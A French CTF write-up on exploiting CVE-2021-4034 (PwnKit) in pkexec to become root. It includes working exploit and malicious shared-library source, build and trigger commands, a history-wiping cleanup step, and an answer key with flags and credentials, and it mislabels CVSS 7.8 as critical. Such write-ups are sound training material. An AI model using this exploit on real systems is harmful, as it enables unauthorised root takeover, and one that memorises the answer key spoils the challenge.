# Write-up — Ghost in the Shadows
**CryptAbyss CTF 2026 | Catégorie : Linux Privilege Escalation**

---

## Informations du challenge

| Champ | Détail |
|---|---|
| Nom | Ghost in the Shadows |
| Vaisseau | SHADOW-5 |
| CVE | CVE-2021-4034 (PwnKit) |
| CVSS | 7.8 — CRITICAL |
| Difficulté | Hard |
| Catégorie | System |
| OS cible | Ubuntu 20.04.3 LTS (Focal Fossa) |
| Version polkit cible | 0.105-26ubuntu1 |
| Auteur | Jeffrey JOANNEN / System |

---

## Description

> Vous avez obtenu un accès SSH limité au vaisseau SHADOW-5 en tant qu'utilisateur `operative`. L'administrateur n'a pas patché son système depuis un moment…
>
> Un secret de root vous attend dans `/root/flag.txt`. Trouvez comment élever vos privilèges.

**Accès fourni :**
```
User : operative
Pass : AlienGetto2021!
```

---

## Mise en place de l'environnement (organisateurs)

### Prérequis

- VM Ubuntu 20.04 LTS **non patchée** (snapshot avant `apt upgrade`)
- polkit version `0.105-26ubuntu1` ou antérieure (toute version `< 0.121` est vulnérable)
- Le patch `USN-5252-1` (janvier 2022) ne doit **pas** être appliqué

### Création des flags et de l'environnement

```bash
# Vérifier que pkexec est bien vulnérable
dpkg -l policykit-1
# policykit-1  0.105-26ubuntu1  amd64  ← OK, vulnérable

ls -la /usr/bin/pkexec
# -rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec  ← bit SUID présent

# Utilisateur joueur (sans droits privilégiés)
useradd -m -s /bin/bash operative
echo "operative:AlienGetto2021!" | chpasswd
gpasswd -d operative sudo 2>/dev/null || true
gpasswd -d operative docker 2>/dev/null || true
gpasswd -d operative lxd 2>/dev/null || true

# Flag final
echo "CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}" > /root/flag.txt
chmod 600 /root/flag.txt
chown root:root /root/flag.txt

# Flag intermédiaire 1 — chiffré AES-256-CBC dans un dotfile, dans un dossier caché
mkdir -p /var/.shadow/.intel
echo -n "CryptAbyss{1NT3L_4RCH1V3S_L0C4T3D_SH4D0W_N3TW0RK}" \
    | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a \
      -pass pass:'Shadow5-Intel-Archive-2094!' \
    > /var/.shadow/.intel/.classified.txt
chmod 644 /var/.shadow/.intel/.classified.txt

# Dossier-leurre pour brouiller les pistes (ne contient pas de flag)
mkdir -p /tmp/.operative

# Lore : journal de bord interne (indices partiellement masqués, passphrase à moitié censurée)
mkdir -p /home/operative/Note
cat > "/home/operative/Note/.Note#119" << 'LORE'
[ JOURNAL DE BORD INTERNE VAISSEAU SHADOW-5 ]

Cycle 2094.22 Rapport securite :
  Composant    : CONFIDENTIAL
  Version      : CONFIDENTIAL
  Patch ********* : NON APPLIQUE

Cycle 2094.25 Note personnelle :
  Toute version ******* est concernee.
  CONFIDENTIAL invoque avec ****=**** effectue une lecture ******.
  Il lit ****[****] comme *****[****] puis y reecrit —
  corrompant l'environnement d'execution.
  En forgeant *********, on charge un .so arbitraire
  en contexte SUID root.

  Un fichier d'intel des patrouille est chiffre dans les variables de renseignement.
  La passphrase que j'ai reçu est à moitié censurée pour des raisons de sécurité.
  Il faut que vous la deviniez pour déchiffrer
  Voici la passphrase : 'S******-Intel-Archive-****!'.

  Notre version ******* est largement dans la plage.
Responsable securite #119
[ FIN DU JOURNAL ]
LORE
chown operative:operative "/home/operative/Note/.Note#119"
chmod 600 "/home/operative/Note/.Note#119"
```

Vérification :
```bash
dpkg -l policykit-1 | grep ii
ls -la /usr/bin/pkexec
id operative
```

---

## Write-up — Résolution pas à pas

### Étape 1 — Connexion et reconnaissance initiale

```bash
id
# uid=1001(operative) gid=1001(operative) groups=1001(operative)

uname -a
# Linux shadow-5 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

cat /etc/os-release | head -4
# NAME="Ubuntu"
# VERSION="20.04.3 LTS (Focal Fossa)"

sudo -l
# User operative may not run sudo on shadow-5.
```

Pas de sudo. On passe à l'énumération SUID et du système de fichiers.

### Étape 2 — Découverte du flag intermédiaire chiffré

```bash
find /var -type f -path '*shadow*' 2>/dev/null
# /var/.shadow/.intel/.classified.txt

cat /var/.shadow/.intel/.classified.txt
# U2FsdGVkX18wq/ZQ8C5wT8Cis9TsTpsZWkseEAMVtiYPNdSaGrl7iuPc2YLXmSKg
# EMtp8JL5yGbJkZM/E8mmOdurYisfJwabkC223rs4oik=
```

Contenu chiffré OpenSSL. On note au passage l'existence de `/tmp/.operative/`, un dossier vide servant de leurre — il ne contient aucun flag.

On lit le lore caché pour trouver la passphrase :

```bash
cat "/home/operative/Note/.Note#119"
```

Le journal donne la passphrase à moitié censurée : `'S******-Intel-Archive-****!'`. Deux indices permettent de la reconstituer :
- le nom du vaisseau, **SHADOW-5**, donne le mot masqué de 6 caractères après le `S` → `hadow5`
- l'année récurrente du scénario, mentionnée partout dans les journaux de bord (« Cycle 2094.xx ») → `2094`

La passphrase complète est donc : `Shadow5-Intel-Archive-2094!`

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -a \
    -in /var/.shadow/.intel/.classified.txt \
    -pass pass:'Shadow5-Intel-Archive-2094!'
# CryptAbyss{1NT3L_4RCH1V3S_L0C4T3D_SH4D0W_N3TW0RK}
```

### Étape 3 — Identification de la surface d'attaque

```bash
# Chercher tous les binaires avec le bit SUID
find / -perm -4000 -type f 2>/dev/null

# Résultat intéressant :
# /usr/bin/pkexec   ← cible principale
# /usr/bin/passwd
# /usr/bin/su
# /usr/bin/newgrp

# Vérifier la version exacte de polkit
dpkg -l policykit-1 | grep ii
# ii  policykit-1  0.105-26ubuntu1  amd64
```

La version `0.105-26ubuntu1` est antérieure à `0.121` — elle est **vulnérable à CVE-2021-4034 (PwnKit)**. Le reste du lore décrit déjà le mécanisme : un composant invoqué avec des arguments vides, une lecture hors limites, et le chargement d'une bibliothèque `.so` arbitraire en contexte SUID.

### Étape 4 — Compréhension de la vulnérabilité

CVE-2021-4034 est une vulnérabilité de type **out-of-bounds write** dans `pkexec`, le binaire SUID de polkit, présente sur pratiquement toutes les distributions Linux depuis 2009.

**Mécanisme de la faille :**

Lorsque `pkexec` est invoqué avec un `argc` égal à zéro (tableau `argv` vide), il tente malgré tout de lire `argv[1]`. Ce pointeur sort des limites de `argv` et pointe directement dans `envp[0]`. `pkexec` réécrit ensuite cette valeur en croyant manipuler un argument de ligne de commande, corrompant silencieusement l'environnement.

En forgeant `envp[0]` avec un chemin contrôlé et en détournant la variable `GCONV_PATH`, on force `pkexec` (qui tourne en SUID root) à charger une bibliothèque partagée malveillante — ce qui donne l'exécution de code en tant que root.

```
argv[]  → [NULL]                 ← argc = 0, intentionnellement vide
                ↑ OOB read → pkexec lit envp[0] comme argv[0]
envp[]  → ["pwnkit.so:.", "PATH=GCONV_PATH=.", "CHARSET=pwnkit", "GCONV_PATH=.", NULL]
                ↑ pkexec réécrit envp[0] → corruption de l'environnement
                ↓ GCONV_PATH détourné → chargement de pwnkit.so (bibliothèque malveillante)
Constructeur pwn() → setuid(0) + cat /root/flag.txt
```

### Étape 5 — Préparation de l'exploit

```bash
mkdir /tmp/pwn && cd /tmp/pwn
```

**Fichier `exploit.c` — le lanceur :**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void fatal(const char *msg) { perror(msg); exit(1); }

int main(void) {
    // argv vide : déclenche l'OOB read dans pkexec (argc = 0)
    char *argv[] = { NULL };

    // envp forgé : envp[0] sera lu comme argv[0] par pkexec
    char *envp[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "CHARSET=pwnkit",
        "GCONV_PATH=.",
        NULL
    };

    // Création de la structure de répertoires attendue
    system("mkdir -p 'GCONV_PATH=.'");
    system("cp /usr/bin/pkexec 'GCONV_PATH=./pwnkit.so:.'");
    system("mkdir -p 'pwnkit.so:.'");

    execve("/usr/bin/pkexec", argv, envp);
    fatal("execve");
}
```

**Fichier `payload.c` — la bibliothèque malveillante :**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Exécuté automatiquement au chargement du .so
// pkexec tourne en SUID root → setuid(0) fonctionne
void __attribute__((constructor)) pwn(void) {
    setuid(0);
    setgid(0);
    system("id; cat /root/flag.txt");
}
```

### Étape 6 — Compilation et déclenchement

```bash
# Compiler la bibliothèque malveillante
gcc -shared -fPIC -nostartfiles -o pwnkit.so payload.c

# Compiler le lanceur
gcc -o exploit exploit.c

# Créer la structure de fichiers pour GCONV_PATH
mkdir -p 'GCONV_PATH=.'
cp pwnkit.so 'GCONV_PATH=./pwnkit'
echo "module UTF-8// PWNKIT// pwnkit 2" > 'GCONV_PATH=./gconv-modules'

# Lancer l'exploit
./exploit
```

**Sortie attendue :**

```
uid=0(root) gid=0(root) groups=0(root)
CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}
```

### Étape 7 — Obtention du flag

**Flag :** `CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}`

---

## Résumé de l'attaque

```
operative (uid=1001)
    ↓ find /var → /var/.shadow/.intel/.classified.txt (chiffré)
    ↓ cat lore → passphrase à moitié censurée → reconstituée via "Shadow5" + "2094"
    ↓ openssl enc -d → flag intermediaire 1
    ↓ find / -perm -4000 → /usr/bin/pkexec avec bit SUID détecté
    ↓ dpkg -l policykit-1 → 0.105-26ubuntu1 → CVE-2021-4034 confirmé
    ↓ compile exploit.c + payload.c
    ↓ ./exploit → argc=0 → OOB write dans pkexec → GCONV_PATH détourné
    ↓ pwnkit.so chargé en contexte SUID root → constructeur pwn()
root shell (uid=0)
    ↓ cat /root/flag.txt
CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}
```

---

## Nettoyage (post-CTF)

```bash
# Mettre à jour polkit pour corriger la faille
apt-get install --only-upgrade policykit-1

# Effacer les fichiers temporaires
rm -rf /tmp/pwn

# Effacer l'historique
history -c && rm ~/.bash_history
```

---

## Flags

| Flag | Valeur | Forme déposée sur le disque |
|---|---|---|
| Intermédiaire 1 | `CryptAbyss{1NT3L_4RCH1V3S_L0C4T3D_SH4D0W_N3TW0RK}` | Chiffré AES-256-CBC (base64) dans `/var/.shadow/.intel/.classified.txt`, passphrase à reconstituer via le lore |
| Final | `CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}` | En clair dans `/root/flag.txt` |

---

## Références

- [NVD — CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
- [Qualys Security Advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
- [Ubuntu Security Notice USN-5252-1](https://ubuntu.com/security/notices/USN-5252-1)
- [polkit upstream commit de correction](https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683)
